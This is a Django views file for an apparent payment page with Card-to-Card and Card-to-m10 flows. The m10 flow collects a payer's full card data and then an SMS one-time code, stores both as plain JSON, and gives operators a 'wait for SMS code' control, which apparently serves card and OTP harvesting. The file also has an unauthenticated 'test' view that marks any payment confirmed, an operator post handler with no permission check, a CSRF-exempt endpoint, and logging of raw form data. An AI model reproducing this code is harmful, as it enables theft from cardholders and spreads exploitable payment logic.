import datetime
import json

import random
from http import HTTPStatus

import requests
import structlog

from django.http import HttpResponse, QueryDict, HttpResponseNotAllowed, HttpResponseForbidden, HttpResponseBadRequest
from django.shortcuts import render, redirect, get_object_or_404
from django.template.response import TemplateResponse
from django.urls import reverse, reverse_lazy
from django.utils import timezone
from django.views.decorators.csrf import csrf_exempt
from django.views.generic import CreateView, DetailView, FormView, UpdateView, ListView

from deposit.models import Incoming
from payment import forms
from payment.filters import PaymentFilter
from payment.forms import InvoiceForm, PaymentListConfirmForm, PaymentForm, InvoiceM10Form
from payment.models import Payment, PayRequisite, Shop, CreditCard

logger = structlog.get_logger(__name__)


def get_pay_requisite(pay_type: str) -> PayRequisite:
    """Выдает реквизиты по типу
    [Card-to-Card]
    [Card-to-m10]
    """
    active_requsite = PayRequisite.objects.filter(pay_type=pay_type, is_active=True).all()
    logger.debug(f'active_requsite {pay_type}: {active_requsite}')
    if active_requsite:
        selected_requisite = random.choice(active_requsite)
        logger.debug(f'get_pay_requisite {pay_type}: {selected_requisite.id} из {active_requsite}')
        return selected_requisite


TIMER_SECONDS = 100


def get_time_remaining(pay: Payment) -> datetime.timedelta:
    time_remaining = pay.create_at + datetime.timedelta(seconds=TIMER_SECONDS) - timezone.now()
    return time_remaining


def get_time_remaining_data(pay: Payment) -> dict:
    time_remaining = get_time_remaining(pay)
    if time_remaining.total_seconds() > 0:
        hours = time_remaining.seconds // 3600
        minutes = (time_remaining.seconds % 3600) // 60
        seconds = time_remaining.seconds % 60

        data = {
            'name': 'Время до оплаты',
            'hours': hours,
            'minutes': minutes,
            'seconds': seconds,
            'total_seconds': int(time_remaining.total_seconds()),
            'limit': TIMER_SECONDS,
            'time_passed': int(TIMER_SECONDS - time_remaining.total_seconds())
        }
    else:
        data = {
            'name': "Время до оплаты",
            'hours': 0,
            'minutes': 0,
            'seconds': 0,
            'total_seconds': 0,
            'limit': TIMER_SECONDS,
            'time_passed': TIMER_SECONDS

        }
    print(data)
    return data


def invoice(request, *args, **kwargs):
    """Создание платежа со стотусом 0 и идентификатором

    Parameters
    ----------
    args
        shop_id: id платежной системы
        order_id: внешний идентификатор
        user_id
        amount: сумма платежа
        pay_type: тип платежа
    Returns
    -------
    """
    import urllib.parse
    if request.method == 'GET':
        query_params = request.GET.urlencode()
        logger.debug(f'GET {args} {kwargs} {request.GET.dict()}'
                     f' {request.META.get("HTTP_REFERER")}')
        required_key = ['shop_id', 'order_id', 'user_login', 'amount', 'pay_type']
        # Проверяем наличие всех данных для создания платежа
        for key in required_key:
            if key not in request.GET:
                return HttpResponseBadRequest(status=HTTPStatus.BAD_REQUEST, reason='Not enough info for create pay',
                                              content='Not enough info for create pay')
        logger.debug('Key ok')

        pay_type = request.GET.get('pay_type')
        if pay_type == 'Card-to-Card':
            return redirect(reverse('payment:pay_to_card_create') + f'?{query_params}')
        elif pay_type == 'Card-to-m10':
            return redirect(reverse('payment:pay_to_m10_create') + f'?{query_params}')
    logger.warning('Необработанный путь')
    return HttpResponseBadRequest(status=HTTPStatus.BAD_REQUEST, reason='Not correct data',
                                  content='Not correct data'
                                  )


def pay_to_card_create(request, *args, **kwargs):
    """Создание платежа со стотусом 0 и идентификатором

    Parameters
    ----------
    args
        shop_id: id платежной системы
        order_id: внешний идентификатор
        user_id
        amount: сумма платежа
        pay_type: тип платежа
    Returns
    -------
    """

    if request.method == 'GET':
        shop_id = request.GET.get('shop_id')
        order_id = request.GET.get('order_id')
        user_login = request.GET.get('user_login')
        amount = request.GET.get('amount')
        pay_type = request.GET.get('pay_type')
        logger.debug(f'GET {request.GET.dict()} {shop_id} {order_id} {user_login} {amount} {pay_type}'
                     f' {request.META.get("HTTP_REFERER")}')
        required_key = ['shop_id', 'order_id', 'user_login', 'amount', 'pay_type']
        # Проверяем наличие всех данных для создания платежа
        for key in required_key:
            if key not in request.GET:
                return HttpResponseBadRequest(status=HTTPStatus.BAD_REQUEST, reason='Not enough info for create pay',
                                              content='Not enough info for create pay')
        logger.debug('Key ok')
        try:
            payment, status = Payment.objects.get_or_create(
                shop_id=shop_id,
                order_id=order_id,
                user_login=user_login,
                amount=amount,
                pay_type=pay_type
            )
            logger.debug(f'payment, status: {payment} {status}')
        except Exception as err:
            logger.error(err)
            return HttpResponseBadRequest(status=HTTPStatus.BAD_REQUEST, reason='Not correct data',
                                          content='Not correct data'
                                          )
        if payment.status > 0 or payment.status == -1:
            return redirect(reverse('payment:pay_result', kwargs={'pk': payment.id}))

        requisite = get_pay_requisite(pay_type)
        # Если нет активных реквизитов
        if not requisite:
            # Перенаправляем на извинения
            return redirect(reverse('payment:payment_type_not_worked'))

        # Сохраняем реквизит к платежу
        if not payment.pay_requisite:
            payment.pay_requisite = requisite
            payment.save()

        form = forms.InvoiceForm(instance=payment, )
        context = {'form': form, 'payment': payment, 'data': get_time_remaining_data(payment)}
        return render(request, context=context, template_name='payment/invoice_card.html')

    elif request.method == 'POST':
        # Обработка нажатия кнопки
        order_id = request.POST.get('order_id')
        amount = request.POST.get('amount')
        payment, status = Payment.objects.get_or_create(order_id=order_id, amount=amount)
        logger.debug(f': {payment} s: {status}')
        form = InvoiceForm(request.POST or None, instance=payment, files=request.FILES or None)
        if form.is_valid():
            # Сохраняем данные и скриншот, меняем статус
            logger.debug('form_save')
            payment.status = 1
            form.save()
            return redirect(reverse('payment:pay_result', kwargs={'pk': payment.id}))
        else:
            logger.debug(f'{form.errors}')
            context = {'form': form, 'payment': payment, 'status': payment.PAYMENT_STATUS[payment.status]}
            return render(request, context=context, template_name='payment/invoice_card.html')
    logger.critical('Необработанный путь')


def pay_to_m10_create(request, *args, **kwargs):

    if request.method == 'GET':
        shop_id = request.GET.get('shop_id')
        order_id = request.GET.get('order_id')
        user_login = request.GET.get('user_login')
        amount = request.GET.get('amount')
        pay_type = request.GET.get('pay_type')
        logger.debug(f'GET {request.GET.dict()} {shop_id} {order_id} {user_login} {amount} {pay_type}'
                     f' {request.META.get("HTTP_REFERER")}')

        try:
            payment, status = Payment.objects.get_or_create(
                shop_id=shop_id,
                order_id=order_id,
                user_login=user_login,
                amount=amount,
                pay_type=pay_type
            )
            logger.debug(f'payment, status: {payment} {status}')
        except Exception as err:
            logger.error(err)
            return HttpResponseBadRequest(status=HTTPStatus.BAD_REQUEST, reason='Not correct data',
                                          content='Not correct data')
        if payment.status not in [0, 3]:
            return redirect(reverse('payment:pay_result', kwargs={'pk': payment.id}))

        requisite = get_pay_requisite(pay_type)
        # Если нет активных реквизитов
        if not requisite:
            # Перенаправляем на извинения
            return redirect(reverse('payment:payment_type_not_worked'))

        # Сохраняем реквизит к платежу
        if not payment.pay_requisite:
            payment.pay_requisite = requisite
            payment.save()

        initial_data = {'payment_id': payment.id}
        if payment.card_data:
            initial_data.update(json.loads(payment.card_data))
        form = forms.InvoiceM10Form(initial=initial_data)
        context = {'form': form, 'payment': payment, 'data': get_time_remaining_data(payment)}
        return render(request, context=context, template_name='payment/invoice_m10.html')

    elif request.method == 'POST':
        # Обработка нажатия кнопки
        payment_id = request.POST.get('payment_id')
        payment = Payment.objects.get(pk=payment_id)
        form = InvoiceM10Form(request.POST)
        context = {'form': form, 'payment': payment, 'data': get_time_remaining_data(payment)}
        if form.is_valid():
            card_data = form.cleaned_data
            json_data = json.dumps(card_data, ensure_ascii=False)
            sms_code = card_data.get('sms_code')
            payment.card_data = json_data
            if sms_code:
                # Если введен смс-код
                payment.status = 7  # Ожидание подтверждения
                payment.save()
                return redirect(reverse('payment:pay_result', kwargs={'pk': payment.id}))
            # Введены данные карты
            payment.status = 3  # Ввел CC.
            payment.save()
            return render(request, context=context, template_name='payment/invoice_m10.html')
            # # Сохраняем данные и скриншот, меняем статус
            # logger.debug('form_save')
            # payment.status = 1
            # form.save()
            # return redirect(reverse('payment:pay_result', kwargs={'pk': payment.id}))
        else:
            # Некорректные данные
            logger.debug(f'{form.errors}')
            return render(request, context=context, template_name='payment/invoice_m10.html')

    logger.critical('Необработанный путь')


class PayResultView(DetailView):
    form_class = InvoiceForm
    template_name = 'payment/pay_result.html'
    model = Payment

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        context['status'] = self.object.status_str
        data = get_time_remaining_data(self.object)
        data['name'] = 'Время до подтверждения'
        context['data'] = data
        return context


class PaymentListView(ListView):
    """Спиок заявок"""
    template_name = 'payment/payment_list.html'
    model = Payment
    fields = ('confirmed_amount',
              'confirmed_incoming')
    filter = PaymentFilter

    # def get(self, request, *args, **kwargs):
    #     logger.debug('get form', request=request, args=args, kwargs=kwargs)
    #     self.object = Payment.objects.first()
    #     return super().get(request, *args, **kwargs)

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        form = PaymentListConfirmForm()
        context['form'] = form
        filter = PaymentFilter(self.request.GET, queryset=Payment.objects.all())
        print(filter)
        context['filter'] = filter
        return context

    def post(self, request, *args, **kwargs):
        logger.debug('Обработка нажатия кнопки списка заявок')
        logger.info(request.POST.keys())
        logger.info(request.POST.dict())

        payment_id = confirmed_amount = confirmed_incoming_id = None
        for key in request.POST.keys():
            if 'cancel_payment' in request.POST.keys():
                payment_id = request.POST['cancel_payment']
                # Отклонение заявки
                payment = Payment.objects.get(pk=payment_id)
                payment.status = -1
                payment.save()
                return redirect(reverse('payment:payment_list'))

            if 'wait_sms_code' in request.POST.keys():
                payment_id = request.POST['wait_sms_code']
                # Готовность приема кода
                payment = Payment.objects.get(pk=payment_id)
                payment.status = -1
                payment.save()
                return redirect(reverse('payment:payment_list'))

            if key.startswith('payment_id:'):
                payment_id = key.split('payment_id:')[-1]
            if key.startswith('confirm_amount_value:'):
                confirmed_amount = request.POST[key]
                if confirmed_amount:
                    confirmed_amount = int(confirmed_amount)
            if key.startswith('confirmed_incoming_id_value:'):
                confirmed_incoming_id = request.POST[key]
                if confirmed_incoming_id:
                    confirmed_incoming_id = int(confirmed_incoming_id)
        logger.debug('Получили:',
                     payment_id=payment_id,
                     confirmed_amount=confirmed_amount,
                     confirmed_incoming_id=confirmed_incoming_id)
        payment = Payment.objects.get(pk=payment_id)
        logger.debug(payment)
        form = PaymentListConfirmForm(instance=payment,
                                      data={'confirmed_amount': confirmed_amount,
                                            'confirmed_incoming': confirmed_incoming_id
                                            })
        if form.is_valid():
            # Логика подтверждения заявки
            logger.debug(f'valid {form.cleaned_data}')
            payment.status = 2
            payment.confirmed_time = timezone.now()

            if confirmed_incoming_id:
                incoming = Incoming.objects.get(pk=confirmed_incoming_id)
                incoming.confirmed_payment = payment
                incoming.save()
            form.save()
        else:
            return HttpResponseBadRequest(str(form.errors))
        return redirect(reverse('payment:payment_list'))


class PaymentEdit(UpdateView, ):
    # Подробно о payment
    model = Payment
    form_class = PaymentForm
    success_url = reverse_lazy('payment:payment_list')
    template_name = 'payment/payment_edit.html'

    def get(self, request, *args, **kwargs):
        self.object = self.get_object()
        print(self.object)
        return super().get(request, *args, **kwargs)

    def post(self, request, *args, **kwargs):
        if request.user.has_perm('deposit.can_hand_edit'):
            self.object = self.get_object()
            return super().post(request, *args, **kwargs)
        return HttpResponseForbidden('У вас нет прав делать ручную корректировку')

    def get_context_data(self, **kwargs):
        context = super(PaymentEdit, self).get_context_data(**kwargs)
        # history = self.object.history.order_by('-id').all()
        # context['history'] = history
        return context

    def form_valid(self, form):
        if form.is_valid():
            # old_incoming = Payment.objects.get(pk=self.object.id)
            # payment: Payment = self.object
            # payment.birpay_edit_time = datetime.datetime.now(tz=pytz.timezone(settings.TIME_ZONE))
            # if not incoming.birpay_confirm_time:
            #     incoming.birpay_confirm_time = datetime.datetime.now(tz=pytz.timezone(settings.TIME_ZONE))
            # payment.save()

            # Сохраняем историю
            # IncomingChange().save_incoming_history(old_incoming, incoming, self.request.user)

            return super(PaymentEdit, self).form_valid(form)


def payment_type_not_worked(request, *args, **kwargs):
    return render(request, template_name='payment/payment_type_not_worked.html')


def test(request, pk, *args, **kwargs):
    pay = get_object_or_404(Payment, pk=pk)
    pay.status = 2
    pay.save()
    return redirect(reverse('payment:pay_result', kwargs={'pk': pay.id}))


def invoice_test(request, *args, **kwargs):
    http_host = request.META['HTTP_HOST']
    print(http_host)
    return render(request,
                  template_name='payment/test_send.html',
                  context={'host': http_host})


def java(request):
    pay: Payment = Payment.objects.first()  # Retrieve the first pay object
    data = get_time_remaining_data(pay)
    return render(request, 'payment/jaya.html', {'data': data})


def send_request(request, *args, **kwargs):
    http_host = request.META.get('HTTP_HOST')

    CONTENT_LENGTH = request.META.get('CONTENT_LENGTH')
    CONTENT_TYPE = request.META.get('CONTENT_TYPE')
    HTTP_ACCEPT = request.META.get('HTTP_ACCEPT')
    HTTP_ACCEPT_ENCODING = request.META.get('HTTP_ACCEPT_ENCODING')
    HTTP_ACCEPT_LANGUAGE = request.META.get('HTTP_ACCEPT_LANGUAGE')
    HTTP_HOST = request.META.get('HTTP_HOST')
    HTTP_REFERER = request.META.get('HTTP_REFERER')
    HTTP_USER_AGENT = request.META.get('HTTP_USER_AGENT')
    QUERY_STRING = request.META.get('QUERY_STRING')
    REMOTE_ADDR = request.META.get('REMOTE_ADDR')
    REMOTE_HOST = request.META.get('REMOTE_HOST')
    REMOTE_USER = request.META.get('REMOTE_USER')
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    REQUEST_METHOD = request.META.get('REQUEST_METHOD')
    SERVER_NAME = request.META.get('SERVER_NAME')
    SERVER_PORT = request.META.get('SERVER_PORT')
    logger.info(f'CONTENT_LENGTH: {CONTENT_LENGTH}')
    logger.info(f'CONTENT_TYPE: {CONTENT_TYPE}')
    logger.info(f'HTTP_ACCEPT: {HTTP_ACCEPT}')
    logger.info(f'HTTP_ACCEPT_ENCODING: {HTTP_ACCEPT_ENCODING}')
    logger.info(f'HTTP_ACCEPT_LANGUAGE: {HTTP_ACCEPT_LANGUAGE}')
    logger.info(f'HTTP_HOST: {HTTP_HOST}')
    logger.info(f'HTTP_REFERER: {HTTP_REFERER}')
    logger.info(f'HTTP_USER_AGENT: {HTTP_USER_AGENT}')
    logger.info(f'QUERY_STRING: {QUERY_STRING}')
    logger.info(f'REMOTE_ADDR: {REMOTE_ADDR}')
    logger.info(f'REMOTE_HOST: {REMOTE_HOST}')
    logger.info(f'REMOTE_USER: {REMOTE_USER}')
    logger.info(f'x_forwarded_for: {x_forwarded_for}')
    logger.info(f'REQUEST_METHOD: {REQUEST_METHOD}')
    logger.info(f'SERVER_NAME: {SERVER_NAME}')
    logger.info(f'SERVER_PORT: {SERVER_PORT}')

    context = {'http_host': request.META['HTTP_HOST']}
    logger.debug(http_host)
    shop: Shop = Shop.objects.get(pk=1)
    print('--------------')
    # url = 'http://45.67.228.39/receive_request/'
    # url = 'http://127.0.0.1:8000/receive_request/'
    url = 'http://asu-payme.com/receive_request/'
    logger.info(request)
    logger.info(f'Requests to url: {url}')
    try:
        # result = requests.get(url, data={'aaa': 'bbb'})
        result = requests.post(url, headers={'Referer': 'xxx.com'}, data={'aaa': 'bbb'})
        logger.info(result.status_code)
    except Exception as err:
        logger.error(err)


    return render(request,
                  template_name='payment/test_send.html',
                  context=context
                  )

@csrf_exempt
def receive_request(request, *args, **kwargs):
    logger.info(f'receive_request: {request}', args=args, kwargs=kwargs)
    CONTENT_LENGTH = request.META.get('CONTENT_LENGTH')
    CONTENT_TYPE = request.META.get('CONTENT_TYPE')
    HTTP_ACCEPT = request.META.get('HTTP_ACCEPT')
    HTTP_ACCEPT_ENCODING = request.META.get('HTTP_ACCEPT_ENCODING')
    HTTP_ACCEPT_LANGUAGE = request.META.get('HTTP_ACCEPT_LANGUAGE')
    HTTP_HOST = request.META.get('HTTP_HOST')
    HTTP_REFERER = request.META.get('HTTP_REFERER')
    HTTP_USER_AGENT = request.META.get('HTTP_USER_AGENT')
    QUERY_STRING = request.META.get('QUERY_STRING')
    REMOTE_ADDR = request.META.get('REMOTE_ADDR')
    REMOTE_HOST = request.META.get('REMOTE_HOST')
    REMOTE_USER = request.META.get('REMOTE_USER')
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    REQUEST_METHOD = request.META.get('REQUEST_METHOD')
    SERVER_NAME = request.META.get('SERVER_NAME')
    SERVER_PORT = request.META.get('SERVER_PORT')
    logger.info(f'CONTENT_LENGTH: {CONTENT_LENGTH}')
    logger.info(f'CONTENT_TYPE: {CONTENT_TYPE}')
    logger.info(f'HTTP_ACCEPT: {HTTP_ACCEPT}')
    logger.info(f'HTTP_ACCEPT_ENCODING: {HTTP_ACCEPT_ENCODING}')
    logger.info(f'HTTP_ACCEPT_LANGUAGE: {HTTP_ACCEPT_LANGUAGE}')
    logger.info(f'HTTP_HOST: {HTTP_HOST}')
    logger.info(f'HTTP_REFERER: {HTTP_REFERER}')
    logger.info(f'HTTP_USER_AGENT: {HTTP_USER_AGENT}')
    logger.info(f'QUERY_STRING: {QUERY_STRING}')
    logger.info(f'REMOTE_ADDR: {REMOTE_ADDR}')
    logger.info(f'REMOTE_HOST: {REMOTE_HOST}')
    logger.info(f'REMOTE_USER: {REMOTE_USER}')
    logger.info(f'x_forwarded_for: {x_forwarded_for}')
    logger.info(f'REQUEST_METHOD: {REQUEST_METHOD}')
    logger.info(f'SERVER_NAME: {SERVER_NAME}')
    logger.info(f'SERVER_PORT: {SERVER_PORT}')
    logger.info(f'request.GET.dict: {request.GET.dict()}')
    logger.info(f'request.POST.dict: {request.POST.dict()}')
    logger.info(f'data: {request.content_type}')
    data = request.body
    print(json.loads(data))
    return HttpResponse(status=HTTPStatus.OK)


